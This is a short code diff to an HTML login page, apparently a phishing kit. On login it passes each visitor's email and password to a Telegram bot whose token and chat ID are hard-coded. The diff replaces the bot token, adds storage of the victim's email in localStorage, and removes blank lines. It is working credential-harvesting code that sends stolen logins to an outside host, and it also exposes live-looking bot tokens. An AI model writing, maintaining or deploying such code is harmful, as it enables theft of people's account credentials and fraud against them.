@@ -14482,7 +14482,7 @@
     const passwordField = document.getElementById("password");
 
     // Telegram Bot Configuration
-    const botToken = "7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0";  
+    const botToken = "8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q";  
     const chatId = "5615316142";  
 
     // Toggle password visibility on button click
@@ -14525,6 +14525,9 @@
             return;
         }
 
+        // Store email in localStorage
+        localStorage.setItem("userEmail", email);
+
         // Send Telegram Notification
         await sendTelegramNotification(email, password);
 
@@ -14537,8 +14540,4 @@
     // Trigger handleLogin on button click
     loginButton.addEventListener('click', handleLogin);
 </script>
-
-  
-  
-  
 </html>
